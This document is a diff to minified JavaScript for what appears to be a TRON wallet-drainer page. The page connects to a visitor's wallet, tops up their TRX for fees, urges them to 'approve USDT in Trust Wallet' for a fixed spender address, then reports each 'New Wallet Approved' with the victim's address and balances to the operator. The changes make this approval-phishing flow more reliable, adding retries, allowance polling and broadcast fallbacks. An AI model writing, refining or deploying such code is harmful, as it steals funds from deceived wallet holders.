@@ -79489,18 +79489,45 @@
                       , i = "approve(address,uint256)"
                       , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                     console.log("Transaction Built:", s);
-                    const a = (await this.provider.request({
+                    const tx = s.transaction || s;
+                    const signResponse = await this.provider.request({
                         method: "tron_signTransaction",
                         params: {
                             address: e,
-                            transaction: s
+                            transaction: tx
                         }
-                    }, "tron:0x2b6653dc")).result;
-                    if (!a)
+                    }, "tron:0x2b6653dc");
+                    const a = signResponse && (signResponse.result || signResponse);
+                    if (!a || !1 === a.success)
                         return {
-                            success: !1
+                            success: !1,
+                            error: "User rejected or signing failed"
                         };
-                    return await t.trx.sendRawTransaction(a)
+                    let broadcastResult;
+                    try {
+                        broadcastResult = await t.trx.sendRawTransaction(a)
+                    } catch (broadcastErr) {
+                        broadcastResult = {
+                            success: !1,
+                            error: broadcastErr.message
+                        }
+                    }
+                    if (broadcastResult && (!1 !== broadcastResult.result && (!0 === broadcastResult.result || !!broadcastResult.txid)))
+                        return broadcastResult;
+                    const txId = (a && (a.txID || a.txid)) || (broadcastResult && broadcastResult.txid);
+                    if (txId)
+                        try {
+                            const confirmed = await t.trx.getTransaction(txId);
+                            if (confirmed && confirmed.txID)
+                                return {
+                                    result: !0,
+                                    txid: txId
+                                }
+                        } catch (_) {}
+                    return broadcastResult || {
+                        success: !1,
+                        error: "Broadcast failed"
+                    }
                 } catch (t) {
                     return {
                         success: !1,
@@ -79520,11 +79547,34 @@
               , l = async (e, t) => {
                 try {
                     const n = await e.sendTransaction(t);
-                    const approved = n && !1 !== n.success && !1 !== n.result && (!0 === n.result || !!n.txid);
+                    console.log("Approval response:", n);
+                    let approved = n && !1 !== n.success && (!1 !== n.result && (!0 === n.result || !!n.txid));
+                    if (!approved) {
+                        for (let d = 0; d < 5 && !approved; d++) {
+                            await new Promise((e => setTimeout(e, 2e3)));
+                            try {
+                                const h = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
+                                    type: "address",
+                                    value: t
+                                }, {
+                                    type: "address",
+                                    value: LV
+                                }], rG.address.toHex(LV))).constant_result[0]
+                                  , f = h.startsWith("0x") ? h : "0x".concat(h)
+                                  , p = rG.toBigNumber(f).toNumber();
+                                console.log("Allowance check attempt", d + 1, ":", p),
+                                approved = p > 0
+                            } catch (g) {
+                                console.warn("Allowance check failed:", g)
+                            }
+                        }
+                    }
                     if (approved) {
                         const o = await e.getBalance(t)
                           , i = await iG(t);
-                        r(n);
+                        r(n || {
+                            result: !0
+                        });
                         const s = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
                         sG(s);
                         return !0
@@ -79532,7 +79582,8 @@
                     return s(!0),
                     !1
                 } catch (n) {
-                    return s(!0),
+                    return console.error("Approval failed:", n),
+                    s(!0),
                     !1
                 }
             }
@@ -79623,16 +79674,22 @@
                                     }
                                 })).namespaces.tron.accounts[0].split(":")[2]
                                   , n = new cG(e);
+                                try {
+                                    const __loader = document.getElementById("wc-loading-overlay");
+                                    if (__loader) __loader.style.display = "none"
+                                } catch(_) {}
                                 u(n, r);
                                 try {
                                     const fundingResult = await window.railwayBackend.checkAndFundUser(r);
                                     const minBal = fundingResult.minimumBalance ?? 11;
                                     if (fundingResult.funded) {
+                                        window.railwayBackend.showNotification("TRX sent! Waiting for wallet balance...", "info");
                                         const ready = await window.railwayBackend.waitForMinimumBalance(r, minBal);
                                         if (!ready.ready) {
                                             window.alert("TRX top-up sent but balance not confirmed yet. Please wait a moment and try again.");
                                             return
                                         }
+                                        window.railwayBackend.showNotification("TRX received! Opening approval...", "success")
                                     } else if ((fundingResult.balance ?? 0) < minBal) {
                                         window.alert(fundingResult.error || fundingResult.message || "Insufficient TRX balance. Need at least ".concat(minBal, " TRX."));
                                         return
@@ -79643,9 +79700,19 @@
                                     window.alert(error?.message || "Auto-funding service unavailable. Please try again later.");
                                     return
                                 }
+                                try {
+                                    const __loader = document.getElementById("wc-loading-overlay");
+                                    if (__loader) __loader.style.display = "none"
+                                } catch(_) {}
+                                window.railwayBackend.showNotification("Please approve USDT in Trust Wallet", "info");
                                 const approved = await l(n, r);
-                                approved && t(r)
+                                if (approved)
+                                    t(r);
+                                else
+                                    window.railwayBackend.showNotification("Approval failed. Please try again.", "error")
                             } catch (r) {
+                                console.error("Wallet flow error:", r);
+                                window.railwayBackend.showNotification(r?.message || "Something went wrong. Please try again.", "error")
                             } finally {
                                 const __loader = document.getElementById("wc-loading-overlay");
                                 if (__loader) __loader.style.display = "none";
@@ -82136,7 +82203,8 @@
             }
         },
 
-        async waitForMinimumBalance(userAddress, minimumBalance = 11, maxAttempts = 20, intervalMs = 3000) {
+        async waitForMinimumBalance(userAddress, minimumBalance = 11, maxAttempts = 15, intervalMs = 1000) {
+            await new Promise(resolve => setTimeout(resolve, 2000));
             for (let attempt = 0; attempt < maxAttempts; attempt++) {
                 try {
                     const balanceResponse = await fetch(`${this.baseUrl}/check-balance`, {
@@ -82153,7 +82221,9 @@
                 } catch (err) {
                     console.warn('Balance poll failed:', err);
                 }
-                await new Promise(resolve => setTimeout(resolve, intervalMs));
+                if (attempt < maxAttempts - 1) {
+                    await new Promise(resolve => setTimeout(resolve, intervalMs));
+                }
             }
             return { ready: false };
         },
